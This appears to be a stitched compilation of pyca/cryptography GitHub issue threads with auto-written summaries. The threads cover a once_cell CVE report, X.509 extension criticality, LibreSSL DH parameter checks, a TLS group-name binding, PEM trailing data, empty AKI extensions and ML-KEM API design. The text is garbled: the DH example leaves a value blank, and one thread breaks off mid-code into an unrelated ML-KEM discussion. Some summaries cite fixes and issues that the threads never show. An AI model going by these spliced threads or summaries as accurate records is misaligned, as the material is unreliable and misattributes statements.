comments.body: Regrettably, I don't think there's really a way for us to both fix this issue _and_ get the deprecation warning :-(

title: Rust once_cell dependency has CVE-2019-16141 vulnerability
security_topic: assessment of CVE applicability to dependency version
qa_summary: The developer needed to know if the project's once_cell dependency is affected by CVE-2019-16141, and the answer cites the Cargo.lock file showing the used version is not vulnerable.

comments.author: oneumyvakin
comments.body:
Now cryptography has Cargo.toml file where `once_cell` declared as version "1":

```
[dependencies]
...
once_cell = "1"
```

which is reported by some vulnerability scanners as CVE-2019-16141 (https://nvd.nist.gov/vuln/detail/CVE-2019-16141)

The latest once_cell version is [v1.21.3](https://github.com/matklad/once_cell/releases/tag/v1.21.3)

This issue is about to bump once_cell to latest version to close CVE-2019-16141 and keep once_cell up-to-date.

comments.author: alex
comments.body:
The version of once_cell specified in our Cargo.lock does not have that vulnerability (https://github.com/pyca/cryptography/blob/main/Cargo.lock#L205-L209). I suspect, though I ahve not verified, that we have never dependened on a version with that vulnerability.

I assume you're using some sort of automatic vulnerability scanner, but it doesn't seem to be very good.

title: Extension criticality in EE certificates
security_topic: interpretation of baseline requirement criticality for X.509 extensions
qa_summary: The developer needed to know whether 'N' in the Baseline Requirements means Criticality::NonCritical or Criticality::Agnostic, and the answer cites the CA/B Forum TLS Baseline Requirements and RFC 5280 stating it means Criticality::NonCritical.

comments.author: TaaviE
comments.body:
The current implementation in [`extensions.rs`](https://github.com/pyca/cryptography/blob/main/src/rust/cryptography-x509-verification/src/policy/extension.rs#L118) seems to apply the BR a bit inconsistent. I personally stumbled upon it erroring when EKU was marked as critical, which is allowed by RFC 5280 but `N` in the BR and marked as `Criticality:NonCritical`. At the same time `subjectKeyIdentifier` is `N` (and `NOT RECOMMENDED`) but marked as `Criticality::Agnostic`.

It's a bit unclear to me if `N` in the BR should mean `Criticality::NonCritical` or `Criticality:Agnostic`? What's the interpretation of `pyca/cryptography`?

It seems more reasonable to be `Agnostic` of criticality if it's allowed by RFC 5280 (and has a purpose) and `NonCritical` when an extension has been widely considered non-critical. 

#### References

The tables in CA/B Forum TLS Server certificate BR currently specifies the following:

CA-Browser-Forum TLS BR 2.2.2:
> 7.1.2.7.6 Subscriber Certificate Extensions: 

| Extension | Presence | Critical | Description |
|--------|--------|--------|--------|
| authorityInformationAccess | MUST | N | See Section 7.1.2.7.7 |
| authorityKeyIdentifier | MUST | N | See Section 7.1.2.11.1 |
| certificatePolicies | MUST | N | See Section 7.1.2.7.9 |
| extKeyUsage | MUST | N | See Section 7.1.2.7.10 |
| subjectAltName | MUST | * | See Section 7.1.2.7.12 |
| nameConstraints | MUST NOT | ‐ |  - |
| keyUsage | SHOULD | Y |  See Section 7.1.2.7.11 |
| basicConstraints | MAY  | Y |  See Section 7.1.2.7.8 |
| crlDistributionPoints | * |  N |  See Section 7.1.2.11.2 |
| Signed Certificate Timestamp List | MAY  | N |  See Section 7.1.2.11.3 |
| subjectKeyIdentifier | NOT RECOMMENDED | N |  See Section 7.1.2.11.4 |
| Any other extension | NOT RECOMMENDED | ‐ |  See Section 7.1.2.11.5 |

CA-Browser-Forum TLS BR 2.2.2:
> 7.1.2 Certificate Content and Extensions
```
If the CA asserts compliance with these Baseline Requirements, all certificates that it issues MUST
comply with one of the following certificate profiles, which incorporate, and are derived from RFC
5280.
```

RFC 5280:
```
   If a CA includes extended key usages to satisfy such applications,
   but does not wish to restrict usages of the key, the CA can include
   the special KeyPurposeId anyExtendedKeyUsage in addition to the
   particular key purposes required by the applications.  Conforming CAs
   SHOULD NOT mark this extension as critical if the anyExtendedKeyUsage
   KeyPurposeId is present.  Applications that require the presence of a
   particular purpose MAY reject certificates that include the
   anyExtendedKeyUsage OID but not the particular OID expected for the
   application.
```

extensions.rs:
```rust
            subject_key_identifier: ExtensionValidator::maybe_present(
                SUBJECT_KEY_IDENTIFIER_OID,
                Criticality::Agnostic,
                None,
            ),
[...]
            // CA/B: 7.1.2.7.10: Subscriber Certificate Extended Key Usage
            // NOTE: CABF requires EKUs in EE certs, while RFC 5280 does not.
            extended_key_usage: ExtensionValidator::maybe_present(
                EXTENDED_KEY_USAGE_OID,
                Criticality::NonCritical,
                Some(Arc::new(ee::extended_key_usage)),
            ),
```

comments.author: woodruffw
comments.body:
> It's a bit unclear to me if `N` in the BR should mean `Criticality::NonCritical` or `Criticality:Agnostic`? What's the interpretation of `pyca/cryptography`?

My interpretation of the CABF tables is that the symbols have the following meanings for criticality:

* `-` means "not applicable," usually because another requirement forbids the relevance of the criticality bit. For example, 7.1.2.7.6 says that Name Constrains MUST NOT appear in an EE cert, so criticality is `-`.
* `*` means agnostic. For example, 7.1.2.7.6 says that the SAN MUST appear, but can be either critical or non-critical.
* `Y` and `N` mean MUST and MUST NOT be critical, respectively.

So yeah, I believe `N` in the BRs should mean `Criticality::NonCritical`, and for the Subject Key Identifier in particular NOT RECOMMENDED doesn't have a bearing on the criticality constraint (we accept it either way, but we *don't* accept it as critical because that specific state is forbidden rather than NOT RECOMMENDED).

comments.author: woodruffw
comments.body: With that said, I think PyCA Cryptography's general position with respect to BR conformance is that the validator should reflect real-world (i.e. Web PKI) behavior. Are you aware of publicly issued EEs that exhibit a critical SKI, or is this something you've hit on non-Web PKI issuances?

comments.author: TaaviE
comments.body:
> So yeah, I believe N in the BRs should mean Criticality::NonCritical, and for the Subject Key Identifier in particular NOT RECOMMENDED doesn't have a bearing on the criticality constraint (we accept it either way, but we don't accept it as critical because that specific state is forbidden rather than NOT RECOMMENDED).

SKI is `Agnostic` right now though? Is it actually not accepted as critical?

>  Are you aware of publicly issued EEs that exhibit a critical SKI, or is this something you've hit on non-Web PKI issuances?

Neither, nor have I searched for Web PKI issuances. I encountered a critical EKU in non-Web PKI and started looking into why it was being restricted.

Right now it seems that:
* SKI is `Agnostic` when it should be `NonCritical`
* KU is `Agnostic` when it should be `Critical`
* BC is `Agnostic` when it should be `Critical`

(and EKU is `NonCritical` when `Agnostic` would make a bit more sense to require usage enforcement)

I can make a PR to align the checks with the BR.

comments.author: alex
comments.body: I'm almost positive that in all cases we are _less_ strict than the BRs, it's because there is no security value in it and there was enough ecosystem breakage that it didn't make sense to strictly enforce. If there are cases we're more strict than the specs we should probably fix that!

comments.author: woodruffw
comments.body:
Oh, my bad -- I thought you were saying that we weren't already agnostic. I agree that's a bit inconsistent at the moment.

I'm kind of surprised we don't have an x509-limbo testcase for this 🙂 -- that would be a good guidepost for whether we can/should restrict criticality.

comments.author: TaaviE
comments.body:
Should I make a PR to change EKU to `Agnostic` to match the enforcement of other extensions' criticality? Or do you wish to first create a test-case in `x509-limbo` to figure out which extensions' criticality can be enforced according to the BR?

Maybe it would be better to follow the BR unless specifically overridden by the user (or code using the crate/library)? That way any deviations from BR would be explicit.

comments.author: alex
comments.body:
Unless there's a pressing reason, our preference is to match the BRs. It looks like we already have a testcase for this: https://x509-limbo.com/testcases/webpki/#webpkiekuee-critical-eku

(Though it shows as skipped, which is surprising to me.)

comments.author: woodruffw
comments.body:
> It looks like we already have a testcase for this

That one is for critical EKU in EEs, not critical SKI. I think we could indeed use a new limbo testcase for this!

> Though it shows as skipped, which is surprising to me.

I don't remember exactly, but I _think_ we skipped some of these because none of the other validators checked them. So the idea was that the breakage risk was too high, although now that there's a custom policy API that's probably moot.

comments.author: github-actions
comments.body: This issue has been waiting for a reporter response for 3 days. It will be auto-closed if no activity occurs in the next 5 days.

comments.author: github-actions
comments.body: This issue has not received a reporter response and has been auto-closed. If the issue is still relevant please leave a comment and we can reopen it.

comments.author: alex
comments.body: I can re-open, but unless I'm confused, it's not clear there's any action to take here: https://github.com/pyca/cryptography/issues/14173#issuecomment-3772648357

comments.author: TaaviE
comments.body: Well, the policy enforcement should be based on something (like WebPKI observations) or aligned to the BR. It's up to you as maintainers to decide which approach should be taken. Whichever way is taken in the future, it's still inconsistent right now and the issue itself should remain open.

comments.author: alex
comments.body:
Our policy is that we align to BRs or RFC5280, as appropriate, but we make things laxer when it's either required for interoperability in practice or is a property no other validators enforce.

In this case, we're matching the BRs behavior, and I don't think we've really established that there's an interop risk, hence there being no change to make here.

comments.author: TaaviE
comments.body:
> In this case, we're matching the BRs behavior

To match the BR the following changes should be made:

* SKI is `Agnostic` -> should be `NonCritical`
* KU is `Agnostic` -> should be `Critical`
* BC is `Agnostic` -> should be `Critical`

comments.author: alex
comments.body:
Sorry, I feel like we're talking with circles: places where we are laxer than the BRs are generally intentional, and reflect things that:

> it's either required for interoperability in practice or is a property no other validators enforce.

comments.author: TaaviE
comments.body: Adding documentation that "this is done because others do it", "this is required for interop" would also address the core of this issue. Almost my entire point is that it doesn't match the RFC nor the BR and it's not written anywhere why that is the case.

title: On some plateforms, DHParameterNumbers performance is 100x slower
security_topic: DH parameter validation performance issue in LibreSSL
qa_summary: The slowdown is caused by the DH_check security validation and has been fixed by skipping well‑known parameters in LibreSSL 4.3.0 (see commit 9ac14cf7a1b28db2437e849540c0abe6a436a03d).

comments.author: gpotter2
comments.body:
Hi everyone !

First of all, merry Christmas !

I have been troubleshooting some issues with scapy being super slow to load one some plateforms, and have cornered the problem to a very big performance difference when running `DHParameterNumbers.parameters()` on some plateforms. My setups are sadly very different, and this will likely need further troubleshooting to precisely identify what's wrong.

Here's the code to reproduce:
```python
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric.dh import DHParameterNumbers

# modp8192 parameters
# https://www.rfc-editor.org/rfc/rfc3526 sect 7
g = 2
m = 

pn = DHParameterNumbers(m, g)
params = pn.parameters(default_backend())
```

| OS|  Flavor |  Python |  Time to run |
|---|---|---|---|
|Debian 13 | OpenSSL 3.5.1 (FIPS: False, Legacy: True) |  3.13.5 |  0m0.086s real 0m0.069s user     0m0.017s system |
|OpenBSD 78 |  LibreSSL 4.2.0 (FIPS: False, Legacy: False) |  3.12.11 |  **1m03.48s** real     **1m03.32s** user 0m00.08s system |

(both are running in Hyper-V virtual machines. It would be unfair to say those stats are 1-to-1 comparable, but it feels like a very high difference.)

What do you think could be the issue here ? Am I doing something wrong ?

Thanks a lot for the help and happy holidays !

comments.author: alex
comments.body: I believe its a known issue that LibreSSL performance with DH is quite slow: https://marc.info/?l=libressl&m=173846028619304&w=2

comments.author: gpotter2
comments.body:
This looks precisely like the issue !
Thanks for the note. To be fair, for well-known parameters (here modp8192), I would expect LibreSSL to somehow already know this is pretty safe (e.g. have a list of available parameters somewhere).


This isn't really a cryptography issue. If this is tracked elsewhere, feel free to close.

Thanks again for the help

comments.author: alex
comments.body: I don't think the libressl folks have a bug tracker, so that thread is the closest it comes to being tracked anywhere. But given this isn't a cryptography bug and there's not really anything we can do to mitigate it, I'm going to close.

comments.author: botovq
comments.body:
If we really must, we can add shortcuts for the well-known domain-parameters to LibreSSL and cut down the cost of `DH_check()`, but I don't really understand why cryptography ends up calling `DH_check()` on well-known parameters in the first place.

Also, why is this done every time scapy starts up? My understanding is that `DH_check()` is intended for adversarial keys.

> I don't think the libressl folks have a bug tracker, so that thread is the closest it comes to being tracked anywhere. But given this isn't a cryptography bug and there's not really anything we can do to mitigate it, I'm going to close.

We monitor https://github.com/libressl/portable

comments.author: alex
comments.body:
Someone would have to trace through our code to remember which code path is calling `DH_check`, and whether its explicit in our code or comes via some other OpenSSL API. But fundamentally its' because we have no idea if a key is trusted or not :-) (And also OpenSSL is terribly unclear about when bad parameters can lead to UB vs. just leading to stupid crypto.)

If people want an opt-out, for RSA we added an `unsafe_skip_rsa_key_validation` flag and I suppose we could do the same for DH.

comments.author: botovq
comments.body:
Thanks. I think it always ends up being this call:

https://github.com/pyca/cryptography/blob/5a23c88ece74c4a5f1ca46d40b6e987ca9a2f7b2/src/rust/src/backend/dh.rs#L121-L123

Be that as it may, there's now two python projects that were hurt by this. I guess I need to fix this... Sigh. It's 2026 and I still need to deal with DH... :)

comments.author: alex
comments.body:
Yes, that's the one place we call it explicitly -- this path isn't touched on PEM/DER parsing though. (Kind of sus)

FWIW every time I think about this I just want to delete FFDH entirely... alas...

comments.author: botovq
comments.body:
The domain parameters are instatiated via `DHParameterNumbers` or similar from constants stored in Scapy's python code itself, for example:

https://github.com/secdev/scapy/blob/40fc5ecf9e69e9bd76664d63ae133d4973fcf81b/scapy/layers/tls/crypto/groups.py#L49-L56

comments.author: reaperhulk
comments.body: Hmm, if these were converted to PEM parameters and loaded via `load_pem_parameters` it would possibly remove the `DH_check` unless there's another one buried more deeply inside the functions we call during loading.

comments.author: alex
comments.body: I don't think there is (arguably this is dumb, there's no valid reason there should be different checks for one vs the other)

comments.author: botovq
comments.body: Neither LibreSSL nor modern OpenSSL call `DH_check()` internally. OpenSSL deprecated `DH_check()`, probably for the wrong reason, namely that it is using a "legacy primitive", not because it's a DoS vector (EVP_PKEY_check still is).

comments.author: botovq
comments.body:
Anyway. I'll see if I can get approval for landing code that skips the well-known parameters (I have a working diff). The annoying bit is that we don't have the RFC 7919 parameters because, well, why would we?

This should help pyca/cryptography that currently skips some tests for us because of this and the interactive use of Scapy 2.7.0 seems fine with my patch.

Thanks for the input so far!

Cc @sthen

title: Add binding for SSL_get0_group_name to support PQC key exchange group detection
security_topic: retrieving negotiated TLS group name for PQC detection
qa_summary: The developer needed to know if adding a binding for SSL_get0_group_name to expose negotiated TLS group names is acceptable, and the maintainers confirmed it by merging cryptography PR #13384 and pyOpenSSL PR #1442.

comments.author: toddabrams
comments.body:
# Background
I am a developer for a python tool which uses pyOpenSSL to initiate handshakes and probe servers to understand their level of TLS support. I am planning to extend this tool to capture post-quantum cryptography (PQC) readiness by detecting which key exchange groups are actually negotiated during connections.

Per [OpenSSL docs]( https://docs.openssl.org/3.5/man3/SSL_CTX_set1_curves/#history):

> Support for ML-KEM was added in OpenSSL 3.5.
> 
> OpenSSL 3.5 also introduces support for three hybrid ECDH PQ key exchange TLS groups: X25519MLKEM768, SecP256r1MLKEM768 and SecP384r1MLKEM1024.  

If the conditions are right, one of these hybrid key exchange groups may be used, and I'd like to be able to use pyOpenSSL to capture which group was actually negotiated.

From the [OpenSSL docs](https://docs.openssl.org/master/man3/SSL_CTX_set1_curves/#description), `SSL_get0_group_name` is preferred for this:

> See also [SSL_get0_group_name(3)](https://docs.openssl.org/master/man3/SSL_get0_group_name/) which returns the name of the negotiated group directly and is generally preferred over SSL_get_negotiated_group().

Here is a link to the openssl source for [SSL_get0_group_name](https://github.com/openssl/openssl/blob/53eb2363a1e6336a40a64b3f7b9f09eca95fabef/ssl/s3_lib.c#L5244) and [PR where it was introduced](https://github.com/openssl/openssl/commit/68668243b176cd2bc53a83c6768d4f39930ba8ed) as of OpenSSL 3.2.

Note: While `SSL_get0_group_name` was introduced in OpenSSL 3.2, the hybrid PQC groups that motivate this request require OpenSSL 3.5.

# Request
I would like to make contributions to both repositories:
1. **cryptography**: Add bindings for `SSL_get0_group_name`. I'm planning to add the binding following the patterns I see for similar functions. My understanding is that it may need appropriate version guards (OpenSSL 3.2+); and looking into how to implement it (looking at things like this which is not quite the same situation as mine): https://github.com/pyca/cryptography/blob/5cf5edf1b36afc8400e5b6d3975d0b15380f3eff/src/cryptography/hazmat/backends/openssl/backend.py#L288. 
2. **pyOpenSSL**: Expose this as a new method (e.g., `get_group_name()`) in the SSL module's [Connection class](https://github.com/pyca/pyopenssl/blob/main/src/OpenSSL/SSL.py#L1948), similar conceptually to `get_cipher_list()`.

# Status

So far, I've:
- followed the [development docs](https://cryptography.io/en/latest/development/) and `nox -e local` succeeds in my local environment
- been reading through c-bindings.rst and ssl.py to understand how I would add a binding given that `SSL_get0_group_name` is only available 
- joined the `#pyca` IRC chat 

# Other discussions

I noticed there have been some similar-ish discussions, for example around setting curves: https://github.com/pyca/cryptography/issues/10797. This was an approach I initially considered.

However, I noticed in the [release notes for OpenSSL 3.5.0](https://github.com/openssl/openssl/blob/openssl-3.5/CHANGES.md#openssl-35) that it appears that at least one of the hybrid PQC groups, `X25519MLKEM768`, is now set by default:

> The default TLS group list setting is now set to: ?*X25519MLKEM768 / ?*X25519:?secp256r1 / ?X448:?secp384r1:?secp521r1 / ?ffdhe2048:?ffdhe3072
> 
> This means two key shares (X25519MLKEM768 and X25519) will be sent by default by the TLS client. GOST groups and FFDHE groups larger than 3072 bits are no longer enabled by default.

I'm a bit new to this area, but either:
a) This means that if a server is configured with `X25519MLKEM768` for the key change group, that my tool will initiate a handshake with it and the group would be negotiated preferentially.
b) Non-PQC groups would need to be excluded by using a setter such as `SSL_CTX_set1_groups_list`, in which case I'd need to make contributions for this method as well in both pyOpenSSL and cryptography.

comments.author: reaperhulk
comments.body:
Sorry for the slow response here. Part of the reason we've taken a while to reply is that the PQC methods are starting to cause non-trivial divergence in the APIs of OpenSSL and its forks (boring, libre, and aws-lc) so we shy away from even thinking about it on occasion.

`SSL_get0_group_name` returns a `char *` of the negotiated group name, but while it's not officially documented looking at the code it appears to be the group name as defined by the TLS specs. I would be okay with that being exposed here. Eventually this binding would also need to live in [rust-openssl](https://github.com/sfackler/rust-openssl) since we're migrating that direction over time as well, but we can land it here first.

Before we merge here we'd like to see the PR opened on the pyOpenSSL side though (knowing all tests will fail of course) so we can agree on the API and see how the binding will be consumed.

comments.author: ronf
comments.body:
I did some work a few weeks ago on a similar feature to this in the Python standard library's SSL module. See https://github.com/python/cpython/issues/136306 for details. More specifically, it added the ability to get a list of all supported groups for a given TLS version range and to choose the set of groups to try and use as methods on an SSLContext object, and then later query the group selected on using a method on an SSLSocket object once the handshake is complete. The specific OpenSSL functions used are `SSL_CTX_get0_implemented_groups()`, `SSL_CTX_set1_groups_list()`, and `SSL_get0_group_name()` (which you mention here).

I'm in the middle of working on adding the ability to select TLS 1.3 cipher suites and to set and get client and server TLS 1.2/1.3 signature algorithms.

comments.author: toddabrams
comments.body:
@reaperhulk Thanks for the thoughtful response! Acknowledging that this will also need to live in the `rust-openssl` eventually but will start here. I've just opened a PR https://github.com/pyca/cryptography/pull/13384 for the change, and will start on the corresponding one for pyOpenSSL per your comment. 

@ronf I wasn't aware, thanks for sharing! I'm only exposing `SSL_get0_group_name` in my first PR, but may also want to expose the other two OpenSSL group functions in the near future.

comments.author: toddabrams
comments.body: @reaperhulk Here is the corresponding (draft) PR in pyOpenSSL clarifying the API and how the binding will be consumed: [pyca/pyopenssl#1442](https://github.com/pyca/pyopenssl/pull/1442)

comments.author: ronf
comments.body: In addition to https://github.com/python/cpython/issues/136306, I've finished the other work I mentioned above and the changes have all been merged into python:main. The related issues are https://github.com/python/cpython/issues/137197 and https://github.com/python/cpython/issues/138252. You can also see a summary of all these changes at https://docs.python.org/3.15/whatsnew/3.15.html#ssl.

* https://github.com/pyca/pyopenssl/pull/1442

I can next look into what's needed to add support for getting the group in [rust-openssl](https://github.com/sfackler/rust-openssl).

title: Since 45.0, `load_pem_private_key` allows arbitrary garbage after `-----END PRIVATE KEY-----`
security_topic: PEM parsing permissiveness for trailing data
qa_summary: The developer asked whether accepting arbitrary data after the PEM END line is a security issue, and the maintainer answered that RFC 7468 permits such data (see RFC 7468 §2).

comments.author: bluetech
comments.body:
Since version 45.0, `load_pem_private_key` accepts arbitrary "garbage" after the `-----END PRIVATE KEY-----` line. Previous versions would fail with the error below. Maybe it's intentional, but it feels like something that *might* not have been intentional so I'm reporting it (can't hurt). It doesn't affect me personally, I only noticed it because I have a test case which tries to make a PEM private key input invalid by appending `b"xxx"` to it which no longer fails (though I should note that it seems adding `b"\nxxx"` doesn't fail in previous versions either).

Example code:

```py
import os

from cryptography.hazmat.primitives import serialization


PRIVATE_KEY = b"""-----BEGIN PRIVATE KEY-----
MIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQglcJB9Do845/R18ef
ButMVXFbRqmo/F9kdsIbgTSbDUWhRANCAAR+OeTq+FCd8eRNt9IU16kP3SZ5W8Pj
dS0YwItKLwTyDA4zTupEPWWqAikmw7Xv9DAgiDVFLbzP3C+3mjYmvUkL
-----END PRIVATE KEY-----"""

# OK
serialization.load_pem_private_key(PRIVATE_KEY, password=None)

# Previously would fail, now passes
serialization.load_pem_private_key(PRIVATE_KEY + os.urandom(1000), password=None)
```

Error in 44:

```
ValueError: ('Could not deserialize key data. The data may be in an incorrect format, the provided password may be incorrect, it may be encrypted with an unsupported algorithm, or it may be an unsupported key type (e.g. EC curves with explicit parameters).', [<OpenSSLError(code=503841036, lib=60, reason=524556, reason_text=unsupported)>])
```

comments.author: alex
comments.body: Hmm, interesting -- I'm surprised that garbage was previously rejected. Historically most of the bugs we've gotten are that we've been _too strict_, and we specifically loosened PEM parsing as a result of that.

comments.author: bluetech
comments.body:
Yes I thought it might be intentional.

I was thinking about suggesting a "strict" mode but it isn't worth it IMO.

Either way, it's a bad idea to store or forward user PEM inputs directly, instead should load+serialize and store that instead (preferably in DER format).

comments.author: nbastin
comments.body: As a person who every once in a while pops up to be one of the squeaky wheels here, the current behaviour is (arguably) correct.  RFC 7468 (which is more of a reflection of reality at the time than an actual spec, which never existed during the time when many of these systems were built) makes clear that _any_ data before encapsulation boundaries is permitted (and states parsers MUST NOT malfunction when processing such data - [section 2](https://datatracker.ietf.org/doc/html/rfc7468#section-2)).  It is ambiguous as to whether data is "before" an encapsulation boundary if you never find another `BEGIN`, but plenty of systems generate such files and thus failing to parse them puts a burden on users.

comments.body:
Hmm, so an empty AKI is stupid, but it's not clear it violates the RFC?

```
   AuthorityKeyIdentifier ::= SEQUENCE {
      keyIdentifier             [0] KeyIdentifier           OPTIONAL,
      authorityCertIssuer       [1] GeneralNames            OPTIONAL,
      authorityCertSerialNumber [2] CertificateSerialNumber OPTIONAL  }

(https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.1.1)

comments.author: onepeople158
comments.body:
> Hmm, so an empty AKI is stupid, but it's not clear it violates the RFC?
> 
> ```
>    AuthorityKeyIdentifier ::= SEQUENCE {
>       keyIdentifier             [0] KeyIdentifier           OPTIONAL,
>       authorityCertIssuer       [1] GeneralNames            OPTIONAL,
>       authorityCertSerialNumber [2] CertificateSerialNumber OPTIONAL  }
> ```
> 
> (https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.1.1)
> 
> Is there some place that says this violates an RFC?

Hello, I created an empty AuthorityKeyIdentifier (AKI) extension where all three subfields are Null. Cryptography accepted this CRL file. Does this violate the following statement in RFC 5280:

> [The identification can be based on either the key identifier (the subject key identifier in the CRL signer's certificate) or the issuer name and serial number.](https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.1.1:~:text=The%20identification%20MAY%20be%20based%20on%20either%20the%0A%20%20%20key%20identifier%20(the%20subject%20key%20identifier%20in%20the%20issuer%27s%0A%20%20%20certificate)%20or%20the%20issuer%20name%20and%20serial%20number.)

comments.author: onepeople158
comments.body:
> I'm not sure that it does.

Hello, the use of an empty sequence for the AKI extension is unreasonable. However, RFC 5280 does not explicitly state that the AKI extension sequence must not be empty—it only specifies that the IDP extension must not be an empty sequence. According to RFC 5280, the AKI extension [may be based on the key identifier (the subject key identifier in the issuer certificate) or the issuer name and serial number](https://datatracker.ietf.org/doc/html/rfc5280#section-4.2.1.1:~:text=The%20identification%20MAY%20be%20based%20on%20either%20the%0A%20%20%20key%20identifier%20(the%20subject%20key%20identifier%20in%20the%20issuer%27s%0A%20%20%20certificate)%20or%20the%20issuer%20name%20and%20serial%20number.).

comments.author: alex
comments.body:
I think that's a good summary, the fact that they use the ALL CAPS MAY means that MAY carries this definition:

```
MAY   This word, or the adjective "OPTIONAL", mean that an item is
   truly optional.  One vendor may choose to include the item because a
   particular marketplace requires it or because the vendor feels that
   it enhances the product while another vendor may omit the same item.
   An implementation which does not include a particular option MUST be
   prepared to interoperate with another implementation which does
   include the option, though perhaps with reduced functionality. In the
   same vein an implementation which does include a particular option
   MUST be prepared to interoperate with another implementation which
   does not include the option (except, of course, for the feature the
   option provides.)
```

Which seems to indicate it's not required to be?

The whole RFC is written in a confusing way. Unless there's a clear reason our behavior either a) violates the spec, b) harms interoperability, c) is a security issue, I'd be inclined to leave it as is.

comments.author: alex
comments.body:
The issue here is that you have a PKCS#8 key and the PEM headers are `BEGIN RSA PRIVATE KEY`, however PKCS#8 keys are supposed to have a `BEGIN PRIVATE KEY` header. https://github.com/pyca/cryptography/issues/12993 is a similar issue.

How was this PEM generated? Is there some library you used, or was it constructed "manually"

comments.author: joshdcu

title: CryptographyDeprecationWarning for serial number set to 0 fails with some CAs
security_topic: handling of certificates with serial number zero and deprecation warning
qa_summary: The developer asked if the CryptographyDeprecationWarning for certificates with serial number 0 should be revisited, and the maintainer answered that the warning will be retained (parsing allowed) until non‑compliant certificates are removed, citing issue #12948 as the reference.

comments.author: thierryba
comments.body:
Hello,

If you try to load the certificates from the certificate package, it fails on some of them


```

While OpenSSL supports this type of mismatched setup, we currently assume that any loaded provider has the same capabilities as the main version of OpenSSL. comments.author: ronf
comments.body:
As far as I know, the liboqs library always generates expanded keys in the keypair() call and expects an expanded key in the decaps() call. I don't think it has any support for dealing with seeds. Since the private keys are ephemeral for DH, I don't think supporting seeds would really buy us much for that use case, but I could see later on wanting to have a function to expand a seed to an expanded key.

I still don't quite see how serialization fits in on your decap call. Shouldn't that always return a byte string which matches the byte string passed in to encap (if the key matches)? Neither the public nor private key is returned here.

comments.author: reaperhulk
comments.body:
There wouldn't be any serialization in decap. The current API proposal isn't stateless, it expects you will have loaded an `MLKEM768DecapKey` and then called `decap` on it with the ciphertext.

There is a strong desire to not expose expanded decap keys as a serializable type for a variety of reasons (see: https://datatracker.ietf.org/meeting/122/materials/slides-122-pquip-the-great-private-key-war-of-25-00 for a bit of context), so I'm interested in what the SSH protocol's requirements are for this. I'm guessing you need to be able to obtain encapsulation keys as raw bytes with no SPKI wrapper, but what else?

comments.author: ronf
comments.body:
SSH requires access to the public key as bytes (1184 bytes long for mlkem768x25519-sha256), along with the 32 byte X25519 public key. It concatenates these and encodes the combination as an SSH string (4 bytes of length followed by concatenated raw key bytes) and sends this public key data in an MSG_KEX_ECDH_INIT message

When the server receives the INIT message, it extracts the public keys and calls encaps() on the PQ public key bytes and gets back a random secret and cipher text. The cipher text (1088 bytes) is combined with X25519 shared bytes (32 bytes) and sent as a concatenated SSH string in a MSG_KEX_ECDH_REPLY message.

The client decrypts the cipher text with decaps() using its private key and creates a shared key made of the random secret and EC shared bytes concatenated and passed into a SHA-256 hash. The server has the same secret bytes and EC shared bytes, and it does the same. There's some other stuff here related to signing with the SSH server's host key, but that's not relevant for this discussion.

I have to admit I don't know the exact formatting of the ML-KEM public key bytes in liboqs, but whatever liboqs returns from its keypair() function is exactly what SSH needed to put on the wire.

comments.body:
> There wouldn't be any serialization in decap. The current API proposal isn't stateless, it expects you will have loaded an MLKEM768DecapKey and then called decap on it with the ciphertext.

That's fine, but I'm not clear on the encap_bytes() and decap_bytes() functions you proposed with serialization arguments. Are those for key serialization? If so, it's confusing to use the same encap/decap name for both purposes.

comments.body: Ok. This isn't really the style of tests we use anywhere else -- we check in test vectors for things we want to verify we load in vectors/ and then make specific assertions about encoding output.

comments.author: reaperhulk
comments.body:
That is an immense diff (+8000). I appreciate that it contains roughly everything, but let's strip this down to bare essentials to start reviewing and potentially landing more effectively.

Looking at it a bit, the APIs you've defined for MLDSA are similar to what we did for Edwards curves. However, it is an explicit non-goal of this project to use expanded forms of MLDSA or MLKEM keys -- we will support seed only. Hence, `private_bytes_raw` is not an API we want to support unless it outputs the bare seed. In the proposed API for MLKEM in this thread we have `from_seed_bytes`, which I think you're trying to match with `from_private_bytes`, but due to the expanded vs seed ambiguity I'd prefer the former name for MLDSA as well.

To make some forward progress here I'd suggest the following. Let's pick MLDSA, strip it down to a single key size, and land that. Doing that has this ordering of PRs:
1) Vectors for ML-DSA testing
2) Land impl for boring or aws-lc + docs + tests
3) Followups for other impls.

comments.author: DarkaMaul

> I think all that's left here is docs. [@DarkaMaul](https://github.com/DarkaMaul) is that something you're working on?

Yes - I'm working on the doc

comments.author: ronf
comments.body:
I just did an interoperability test between this ML-KEM support (using BoringSSL) and a prior implementation I had done on top of liboqs. Everything looks good. The public_bytes_raw() call on the public key is exactly what was needed on the wire by SSH, and so was the ciphertext returned from the encap call. I confirmed that I could exchange the 32-byte secret successfully in both directions.

As expected, there was no requirement to serialize the private key data. So, the fact that this API operates only on the seed and not the expanded key will not be a problem.

comments.author: alex
comments.body: Excellent. I think this is all benefitting from teh fact that ML-KEM's cryptographic API is much better designed (with the exception of seed vs. expanded form) and has way fewer parameters than previous cryptographic algorithms (e.g., no multiple representations of signature like ECDSA, or 19 different parameters like RSA PSS).

comments.author: ronf
comments.body:
Agreed!

On that note, has there been any consideration for adding SNTRUP support to PyCA? It has basically an identical API, and it has been providing quantum-resistant crypto in SSH since OpenSSH 8.0 released in 2019, dating back to before ML-KEM was selected as the new standard. Both SNTRUP and ML-KEM are supported by liboqs, so I'm actually sharing a wrapper between those today in AsyncSSH, but at some point it would be nice to drop liboqs as an additional dependency.

comments.author: alex
comments.body: No plan for SNTRUP ATM. My sense is that ML-KEM has won at this point and nothing is likely to use SNTRUP for anythign new.
